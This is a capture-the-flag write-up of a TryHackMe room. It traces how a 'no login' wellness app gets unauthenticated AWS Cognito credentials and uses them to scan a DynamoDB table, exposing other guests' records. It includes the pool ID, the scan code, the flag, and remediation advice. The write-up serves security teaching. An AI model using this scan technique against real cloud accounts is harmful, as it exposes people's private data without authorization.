# Hacker Holidays 2026 – Day 03: Complimentary Wellness App

## Room Overview

The Byte Lotus Wellness app offers guests “complimentary” access without requiring them to create an account or log in. However, the app already knows information about users as soon as it opens.

The objective was to investigate how the application obtained access behind the scenes, identify the AWS service responsible for issuing credentials, and determine whether those credentials could be used to access data belonging to other guests.

This challenge focused on:

* AWS Cognito Identity Pools
* Unauthenticated AWS guest credentials
* IAM permission misconfigurations
* Amazon DynamoDB access
* Broken access control
* Excessive cloud permissions

---

## Scenario

Lambo installed the Byte Lotus Wellness app because it was free and did not require an account or login. The application requested permissions such as camera, microphone, contacts, and location access, but it immediately appeared to know information about the user.

The application’s “no login” design suggested that it was using an alternative mechanism to obtain access credentials.

The challenge objective was to:

1. Identify the AWS mechanism issuing credentials behind the scenes.
2. Use the credentials to access more than the current guest’s record.
3. Retrieve the flag from another guest’s data.

---

## Target

```text
http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
```

---

## Step 1: Inspecting the Application Source Code

I inspected the application’s JavaScript source file, `app.js`.

The following code revealed that the application used an **AWS Cognito Identity Pool**:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.region = AWS_REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

The important values were:

| Configuration    | Value                                            |
| ---------------- | ------------------------------------------------ |
| AWS Service      | Amazon Cognito                                   |
| Identity Pool ID | `us-east-1:836c0949-292d-485b-b532-52d5ca7bb688` |
| AWS Region       | `us-east-1`                                      |
| DynamoDB Table   | `complimentary-GuestWellnessProfiles`            |

The application used:

```javascript
AWS.CognitoIdentityCredentials
```

This indicated that AWS Cognito was issuing temporary credentials to users without requiring them to authenticate.

---

## Step 2: Understanding How the App Identified Guests

The application generated a guest identifier and stored it in the browser’s local storage:

```javascript
function guestId() {
  let id = localStorage.getItem("byteLotusGuestId");

  if (!id) {
    id = "guest-" + Math.random().toString(36).slice(2, 10);
    localStorage.setItem("byteLotusGuestId", id);
  }

  return id;
}
```

The application then used the guest ID to request a specific item from the DynamoDB table:

```javascript
dynamodb.getItem(
  {
    TableName: TABLE_NAME,
    Key: { guest_id: { S: guestId() } },
  },
  function (err, data) {
    if (err) {
      console.error("Could not load dashboard:", err);
      return;
    }

    renderDashboard(data.Item);
  }
);
```

The frontend was designed to retrieve only the current guest’s record using the `GetItem` operation.

However, client-side behavior does not enforce authorization. The actual access restrictions depend on the IAM permissions attached to the Cognito guest role.

---

## Step 3: Obtaining Guest Credentials

The application requested temporary AWS credentials using the Cognito Identity Pool:

```javascript
AWS.config.credentials.get(function (err) {
  if (err) {
    console.error(err);
  } else {
    console.log(
      "Identity ID:",
      AWS.config.credentials.identityId
    );
  }
});
```

The credentials were issued automatically to unauthenticated users.

This explained how the application could access AWS resources without requiring a username, password, or login session.

> **Note:** Temporary AWS credentials should not be exposed publicly or committed to GitHub repositories.

---

## Step 4: Testing DynamoDB Access

The application only used the `GetItem` operation to retrieve one guest record.

To determine whether the IAM role had excessive permissions, I tested the DynamoDB `Scan` operation against the table:

```javascript
const dynamodb = new AWS.DynamoDB({
  region: "us-east-1"
});

dynamodb.scan(
  {
    TableName: "complimentary-GuestWellnessProfiles"
  },
  function (err, data) {
    if (err) {
      console.error("Scan failed:", err);
      return;
    }

    console.table(
      data.Items.map(item => ({
        guest_id: item.guest_id?.S,
        name: item.name?.S,
        notes: item.notes?.S
      }))
    );
  }
);
```

The scan succeeded and returned multiple guest records.

This confirmed that the unauthenticated Cognito role had permission to scan the entire DynamoDB table.

---

## Step 5: Reviewing Other Guest Records

The DynamoDB scan returned records belonging to several guests:

| Guest ID        | Name                                  |
| --------------- | ------------------------------------- |
| `guest-vibe`    | Vibe (Move Fast & Break Things)       |
| `guest-lambo`   | Lambo (@0xMia)                        |
| `guest-vip-042` | Guest VIP-042                         |
| `guest-patch`   | Patch (Have You Tried Turning It Off) |
| `guest-ponzi`   | Ponzi (Satoshi_Probably)              |

The record belonging to `guest-vip-042` contained the flag in its `notes` field.

---

## Flag

```text
THM{fr33_app_fr33_d4t4!}
```

<img width="1919" height="753" alt="image" src="https://github.com/user-attachments/assets/06570d2b-04bf-4a97-8fac-2e7e3ea3002b" />


---

## Vulnerability Analysis

The application used an AWS Cognito Identity Pool to provide unauthenticated users with temporary AWS credentials.

Using Cognito guest access is not inherently insecure. The vulnerability was caused by the IAM permissions associated with the unauthenticated role.

The guest credentials were able to perform a DynamoDB `Scan` operation on the entire table. This allowed an unauthenticated user to retrieve records belonging to other guests.

The intended application behavior was:

```text
Guest → Cognito temporary credentials → Get only their own record
```

The actual behavior was:

```text
Guest → Cognito temporary credentials → Scan the entire DynamoDB table
```

This resulted in unauthorized access to other guests’ information.

---

## Security Impact

An attacker with access to the application could potentially:

* Retrieve information belonging to other guests
* Enumerate all records in the DynamoDB table
* Access sensitive information stored in guest profiles
* Expose private notes and personal data
* Abuse overly permissive cloud permissions without authenticating

---

## Root Cause

The root cause was an **overly permissive IAM policy** attached to the Cognito unauthenticated role.

The policy likely allowed DynamoDB actions beyond what was required by the application.

The guest role should not have been allowed to perform:

```text
dynamodb:Scan
```

on the entire table.

---

## Recommended Remediation

The following controls would help prevent this issue:

1. **Apply the principle of least privilege**

   Grant the Cognito unauthenticated role only the permissions required by the application.

2. **Remove unnecessary DynamoDB permissions**

   The guest role should not have permission to scan the entire table.

3. **Enforce authorization at the AWS IAM layer**

   Client-side restrictions are not security controls. IAM policies should enforce which records a user can access.

4. **Restrict access to individual records**

   Use IAM policy conditions to limit access based on the authenticated or unauthenticated Cognito identity.

5. **Avoid trusting client-generated identifiers**

   The `guest_id` was generated and stored in browser local storage. Client-controlled values should not be treated as proof of authorization.

6. **Monitor AWS activity**

   Use services such as AWS CloudTrail to detect unexpected DynamoDB operations, including unauthorized or unusual `Scan` requests.

---

## Key Takeaways

* AWS Cognito Identity Pools can provide temporary credentials to unauthenticated users.
* A login screen is not the only mechanism that can provide access to cloud resources.
* Temporary credentials must be protected by properly configured IAM policies.
* Client-side application logic does not enforce server-side authorization.
* Excessive IAM permissions can expose cloud data to unauthenticated users.
* The principle of least privilege is essential when configuring cloud identities and permissions.
* DynamoDB `Scan` permissions can expose every item in a table and should be granted only when necessary.

---

## MITRE ATT&CK Mapping

| Tactic            | Technique               | Description                                                                     |
| ----------------- | ----------------------- | ------------------------------------------------------------------------------- |
| Credential Access | Valid Accounts          | The application obtained valid temporary AWS credentials through Cognito.       |
| Discovery         | Cloud Service Discovery | AWS services and resources were identified through the application source code. |
| Collection        | Data from Cloud Storage | Guest data was retrieved from an Amazon DynamoDB table.                         |

---

## Tools and Technologies

* TryHackMe
* AWS Cognito Identity Pools
* AWS IAM
* Amazon DynamoDB
* AWS SDK for JavaScript
* Browser Developer Tools
* JavaScript

---

## Conclusion

The Byte Lotus Wellness app used an AWS Cognito Identity Pool to provide unauthenticated visitors with temporary AWS credentials.

Although the application only intended to retrieve the current guest’s profile, the IAM permissions attached to the guest role were overly permissive. The credentials allowed the DynamoDB `Scan` operation, which exposed records belonging to other guests.

By inspecting the frontend source code, identifying the Cognito Identity Pool and DynamoDB table, obtaining guest credentials, and testing the available permissions, I was able to access another guest’s record and retrieve the flag.

```text
THM{fr33_app_fr33_d4t4!}
```
